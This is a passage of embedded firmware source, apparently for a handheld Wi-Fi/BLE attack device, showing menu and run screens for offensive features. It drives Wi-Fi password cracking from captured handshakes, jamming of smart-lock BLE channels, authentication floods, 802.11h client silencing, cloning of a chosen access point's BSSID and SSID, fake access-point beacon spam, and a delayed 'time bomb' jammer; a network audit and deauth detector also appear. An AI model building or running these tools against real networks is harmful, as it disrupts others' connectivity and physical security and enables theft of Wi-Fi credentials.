  if (gCrackJamUp) ggOled.printf("JAMMING  %lus left",(unsigned long)timeLeft);
  else             ggOled.printf("Listen.. %lus left",(unsigned long)timeLeft);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=abort");
  ggOled.display();
#endif // GG_ENABLE_CRACK
}

// ---------------------------------------------------------------- WIFI CRACK result
static inline void ggScreenCrackDone() {
#if !GG_ENABLE_CRACK
  ggBack(); return;
#else
  if (!gRunInit) { gRunInit = true; }
  if (gEv.back) {
    ggCrackEnd();
    ggBack(); return;
  }
  ggOled.clearDisplay();
  if (!ggCrackDone) {
    ggHeader("CRACKING");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,28);
    ggOled.printf("Trying %lu/%d",(unsigned long)ggCrackTried,GG_CRACK_DICT_N);
    int bar = (int)((uint32_t)ggCrackTried * 100 / GG_CRACK_DICT_N);
    ggOled.setCursor(2,38);
    ggOled.printf("Progress: %d%%", bar);
    ggOled.drawRect(2,47,124,8,SSD1306_WHITE);
    int fill = (int)((uint32_t)ggCrackTried * 120 / GG_CRACK_DICT_N);
    if (fill > 0) ggOled.fillRect(4,49,fill,4,SSD1306_WHITE);
  } else if (ggCrackFound) {
    ggHeader("CRACKED!");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,30);
    ggOled.print("Password found:");
    ggOled.setCursor(2,40);
    char pw[22]; snprintf(pw,22,"%.21s",ggCrackPass); ggOled.print(pw);
  } else if (gCrackTimedOut) {
    ggHeader("TIMEOUT");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,30);
    ggOled.print("No handshake caught");
    ggOled.setCursor(2,40);
    ggOled.printf("Data:%lu EAPOL:%lu",(unsigned long)ggHsDataPkts,(unsigned long)ggHsEapolPkts);
  } else {
    ggHeader("NO MATCH");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18);
    char ssT[16]; snprintf(ssT,16,"%.15s",ggHsTargetSsid); ggOled.print(ssT);
    ggOled.setCursor(2,30);
    ggOled.print("Not in dictionary");
    ggOled.setCursor(2,40);
    ggOled.printf("Tried %d passwords",GG_CRACK_DICT_N);
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=done");
  ggOled.display();
#endif // GG_ENABLE_CRACK
}

// ---------------------------------------------------------------- WIFI RICKROLL menu
static inline void ggScreenRickMenu() {
  static const char* const RICK_ITEMS[] = { "Edit message >", "BROADCAST >" };
  static const char* const RICK_HINTS[] = { "Type your message", "Send it to the air" };
  ggMove(0, 1);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    if (gSel == 0) {
      ggOpenBytes((uint8_t*)ggRickMsg, ggRickLen, "RICKROLL MSG", true, &ggRickLen, 32);
    } else {
      ggClickFire(); ggGo(GS_RICK_RUN);
    }
    return;
  }
  ggMenu("WiFi Rickroll", RICK_ITEMS, 2, gSel, gTop, RICK_HINTS[gSel]);
}

// ---------------------------------------------------------------- WIFI RICKROLL run
static uint32_t gRickStartMs = 0;
static inline void ggScreenRickRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiRickMode = true;
    ggRickCount = 0;
    gWifiTx.channel = 1; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gRickStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  { static uint32_t rLastHop=0; static uint8_t rHi=0; static const uint8_t rHC[]={1,6,11};
    if(millis()-rLastHop>=500){ rLastHop=millis(); rHi=(rHi+1)%3; gWifiTx.channel=rHC[rHi]; ggWifiTxSetChannel(rHC[rHi],gWifiTx); } }
  uint32_t cnt = ggRickCount;
  uint32_t elapsed = (millis()-gRickStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("RICKROLL");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u BROADCAST", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45);
  char mp[22]; snprintf(mp,22,"\"%.19s\"",ggRickMsg);
  ggOled.print(mp);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- SMART LOCK BUZZ
// BLE disruption targeting smart lock data channels. nRF noise on BLE band
// (nRF ch 2-80) + BLE advertising flood. No WiFi needed.
static uint32_t gSlockStartMs = 0;
static bool     gSlockBleUp = false;

static inline void ggScreenSlockRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gSlockBleUp = true;
    ggFloodNrfChLo = 2; ggFloodNrfChHi = 80;
    ggFloodNrfPosA = 2; ggFloodNrfPosB = 40;
    if (ggNrfPresentA) ggNrfNoiseBegin(0,2);
    if (ggNrfPresentB) ggNrfNoiseBegin(1,40);
    ggFloodNrfActive = true;
    gSlockStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gSlockBleUp) { ggBleFloodMode = false; ggBleTxEnd(); gSlockBleUp = false; }
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  uint32_t elapsed = (millis()-gSlockStartMs)/1000;
  uint32_t bPkt = ggBlePktEst();
  gPhase = bPkt/50;
  ggOled.clearDisplay(); ggHeader("SMART LOCK");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.print("BLE BAND FLOOD");
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(bPkt));
  ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("nRF:%u+%u BLE+nRF",ggFloodNrfPosA,ggFloodNrfPosB);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.printf("BACK=stop  %lus",(unsigned long)elapsed);
  ggOled.display();
}

// ---------------------------------------------------------------- NETWORK AUDIT
// Scans WiFi and shows encryption type + security rating for each network.
static const char* ggEncName(uint8_t enc) {
  switch (enc) {
    case 0: return "OPEN";
    case 1: return "WEP";
    case 2: return "WPA";
    case 3: return "WPA2";
    case 4: return "WPA/2";
    case 5: return "ENT";
    case 6: return "WPA3";
    case 7: return "WPA2/3";
    case 8: return "WAPI";
    default: return "???";
  }
}
static const char* ggEncRating(uint8_t enc) {
  switch (enc) {
    case 0: return "NO PASSWORD!";
    case 1: return "WEAK-easy to crack";
    case 2: return "FAIR-outdated";
    case 3: return "GOOD-standard";
    case 4: return "GOOD-mixed mode";
    case 5: return "STRONG-enterprise";
    case 6: return "BEST-modern WPA3";
    case 7: return "GOOD-WPA2/3 trans";
    case 8: return "STRONG-WAPI";
    default: return "UNKNOWN";
  }
}
static uint8_t gNetDetailIdx = 0;

static inline void ggScreenNetAudit() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Network Audit");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Network Audit");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gNetDetailIdx = gSel;
    ggWifiPickScanEnd();
    ggGo(GS_NET_DETAIL);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){
    snprintf(rows[i],22,"%.8s %s %ddB",ggWifiAPs[i].ssid,ggEncName(ggWifiAPs[i].enc),ggWifiAPs[i].rssi);
    p[i]=rows[i];
  }
  static char hBuf[22];
  snprintf(hBuf,22,"%s",ggEncRating(ggWifiAPs[gSel].enc));
  ggMenu("Network Audit", p, ggWifiAPCount, gSel, gTop, hBuf);
}

static inline void ggScreenNetDetail() {
  if (gEv.back) { ggBack(); return; }
  if (gNetDetailIdx >= ggWifiAPCount) { ggBack(); return; }
  const GgWifiAP& ap = ggWifiAPs[gNetDetailIdx];
  ggOled.clearDisplay(); ggHeader(ap.ssid);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,16); ggOled.printf("CH:%u  RSSI:%ddB", ap.channel, ap.rssi);
  ggOled.setCursor(2,25); ggOled.printf("Enc: %s", ggEncName(ap.enc));
  ggOled.setCursor(2,34); ggOled.print(ggEncRating(ap.enc));
  ggOled.setCursor(2,43); ggOled.printf("%02X:%02X:%02X:%02X:%02X:%02X",
    ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5]);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=go back");
  ggOled.display();
}

// ================================================================
//  BATCH 2 SCREENS
// ================================================================

// ---------------------------------------------------------------- AUTH FLOOD (pick + run)
static uint32_t gAuthStartMs = 0;
static bool     gAuthNrfUp = false;

static inline void ggScreenAuthPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Auth target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Auth target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel = ggWifiAPs[gSel].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_AUTH_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Auth target", p, ggWifiAPCount, gSel, gTop, "SEL=flood auth frames");
}

static inline void ggScreenAuthRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiAuthFlood = true;
    ggAuthFloodCnt = 0;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    ggFloodNrfStart(gWifiTx.channel);
    gAuthNrfUp = true;
    gAuthStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    if (gAuthNrfUp) { ggFloodNrfStop(); gAuthNrfUp = false; }
    ggWifiTxEnd(); ggBack(); return;
  }
  ggFloodNrfPump();
  uint32_t cnt = ggAuthFloodCnt;
  uint32_t elapsed = (millis()-gAuthStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/100;
  ggOled.clearDisplay(); ggHeader("AUTH FLOOD");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u MAX PWR", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu auth/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI FUZZER
static uint32_t gFuzzStartMs = 0;
static inline void ggScreenFuzzRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiFuzzMode = true;
    ggFuzzCount = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gFuzzStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  uint32_t cnt = ggFuzzCount;
  uint32_t elapsed = (millis()-gFuzzStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("WIFI FUZZ");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u RANDOM FRM", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu fuzz/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- QUIET STORM (pick + run)
static uint32_t gQuietStartMs = 0;
static inline void ggScreenQuietPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Quiet target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Quiet target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel = ggWifiAPs[gSel].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_QUIET_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Quiet target", p, ggWifiAPCount, gSel, gTop, "SEL=silence clients");
}

static inline void ggScreenQuietRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiQuietMode = true;
    ggQuietCount = 0;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gQuietStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  uint32_t cnt = ggQuietCount;
  uint32_t elapsed = (millis()-gQuietStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/100;
  ggOled.clearDisplay(); ggHeader("QUIET STORM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u 802.11h", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu quiet/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BSSID CLONE (pick + run)
static uint32_t gCloneStartMs = 0;
static inline void ggScreenClonePick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Clone target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Clone target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel = ggWifiAPs[gSel].channel;
    memcpy(ggCloneBssid, ggWifiAPs[gSel].bssid, 6);
    strncpy(ggCloneSsid, ggWifiAPs[gSel].ssid, 32); ggCloneSsid[32] = '\0';
    ggCloneEnc = ggWifiAPs[gSel].enc;
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_CLONE_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Clone target", p, ggWifiAPCount, gSel, gTop, "SEL=clone this BSSID");
}

static inline void ggScreenCloneRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiCloneMode = true;
    ggCloneCount = 0;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gCloneStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  uint32_t cnt = ggCloneCount;
  uint32_t elapsed = (millis()-gCloneStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("BSSID CLONE");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  char cs[16]; snprintf(cs,16,"%.12s",ggCloneSsid);
  ggOled.setCursor(34,18); ggOled.print(cs);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu clone/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- FAKE AP FARM
static uint32_t gFarmStartMs = 0;
static inline void ggScreenFarmRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiFarmMode = true;
    ggFarmCount = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gFarmStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  uint32_t cnt = ggFarmCount;
  uint32_t elapsed = (millis()-gFarmStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("AP FARM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u %u SSIDs", gWifiTx.channel, GG_FARM_N);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu beac/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI TIME BOMB
static inline void ggScreenTimeBomb() {
  if (!gTimeBombArmed) {
    if (gEv.back) { ggBack(); return; }
    if (gEv.up)   { int v=(int)gTimeBombDelay+10; if(v>300)v=300; gTimeBombDelay=(uint16_t)v; }
    if (gEv.down) { int v=(int)gTimeBombDelay-10; if(v<10)v=10; gTimeBombDelay=(uint16_t)v; }
    if (gEv.sel)  { gTimeBombArmed=true; gTimeBombStartMs=millis(); ggClickFire(); }
    ggOled.clearDisplay(); ggHeader("TIME BOMB");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18); ggOled.printf("Delay: %u sec", gTimeBombDelay);
    ggOled.setCursor(2,28); ggOled.print("Starts Channel Thief");
    ggOled.setCursor(2,38); ggOled.print("after countdown");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("SEL=arm  UP/DN delay");
  } else {
    uint32_t elapsed = (millis()-gTimeBombStartMs)/1000;
    if (elapsed >= gTimeBombDelay) {
      gTimeBombArmed = false;
      gJamCh = 1;
      ggBack(); ggGo(GS_JAM_RUN);
      return;
    }
    if (gEv.back) { gTimeBombArmed=false; ggBack(); return; }
    uint32_t left = gTimeBombDelay - elapsed;
    ggOled.clearDisplay(); ggHeader("TIME BOMB");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setTextSize(2); ggOled.setCursor(34,25); ggOled.printf("%lus",(unsigned long)left);
    ggOled.setTextSize(1);
    ggOled.setCursor(2,45); ggOled.print("Jam starts when 0");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=disarm");
  }
  ggOled.display();
}

// ---------------------------------------------------------------- DEAUTH DETECT
static uint8_t gDeauthDetCh = 1;
static uint32_t gDeauthDetChLast = 0;
static inline void ggScreenDeauthDet() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggDeauthDetectBegin();
    gDeauthDetCh = 1;
    esp_wifi_set_channel(gDeauthDetCh, WIFI_SECOND_CHAN_NONE);
    gDeauthDetChLast = millis();
    gRunInit = true;
  }
  if (gEv.back) { ggDeauthDetectEnd(); ggBack(); return; }
  if (gEv.sel) { ggDeauthDetectCnt = 0; }
  uint32_t now = millis();
  if (now - gDeauthDetChLast >= 400) {
    gDeauthDetCh++; if (gDeauthDetCh > 14) gDeauthDetCh = 1;
    esp_wifi_set_channel(gDeauthDetCh, WIFI_SECOND_CHAN_NONE);
    gDeauthDetChLast = now;
  }
  uint32_t daCnt = ggDeauthDetectCnt;
  uint32_t daMs  = ggDeauthLastMs;
  uint8_t  daBss[6]; memcpy(daBss, ggDeauthLastBssid, 6);
  bool recent = (daMs > 0 && now - daMs < 3000);
  ggOled.clearDisplay(); ggHeader("DEAUTH DET");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("CH%u  scanning...", gDeauthDetCh);
  ggOled.setCursor(2,28);
  if (daCnt > 0) {
    ggOled.setTextSize(2); ggOled.printf("%lu!", (unsigned long)daCnt); ggOled.setTextSize(1);
  } else {
    ggOled.setTextSize(2); ggOled.print("0 clear"); ggOled.setTextSize(1);
  }
  if (recent) {
    ggOled.setCursor(2,45); ggOled.printf("%02X:%02X:%02X:%02X:%02X:%02X",
      daBss[0],daBss[1],daBss[2],daBss[3],daBss[4],daBss[5]);
    ggBeep(2800,40);
  } else {
    ggOled.setCursor(2,45); ggOled.print("Monitoring...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  SEL=reset");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI GEOFENCE (pick + watch)
static bool gGeoScanning = true;
static inline void ggScreenGeofence() {
  if (gGeoScanning) {
    if (!gRunInit) { if (ggTrkBleReady) ggTrkScanEnd(); if (ggCopRunning) ggCopScanEnd(); ggWifiPickScanBegin(); gRunInit = true; }
    if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
    if (!ggWifiPickScanPoll()) {
      ggOled.clearDisplay(); ggHeader("Geofence trgt");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("Scanning...");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
      ggOled.display(); return;
    }
    if (ggWifiAPCount==0) {
      ggOled.clearDisplay(); ggHeader("Geofence trgt");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("No networks found");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=go back");
      ggOled.display(); return;
    }
    ggMove(0, ggWifiAPCount-1);
    if (gEv.sel) {
      strncpy(gGeofenceSsid, ggWifiAPs[gSel].ssid, 32); gGeofenceSsid[32] = '\0';
      gGeofenceCh = ggWifiAPs[gSel].channel;
      ggWifiPickScanEnd();
      ggClickFire();
      gGeoScanning = false;
      gGeofenceFound = false;
      gGeofenceLastScan = 0;
      return;
    }
    static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
    for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
    ggMenu("Geofence trgt", p, ggWifiAPCount, gSel, gTop, "SEL=watch this SSID");
    return;
  }
  if (gEv.back) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gGeoScanning = true; ggBack(); return; }
  uint32_t now = millis();
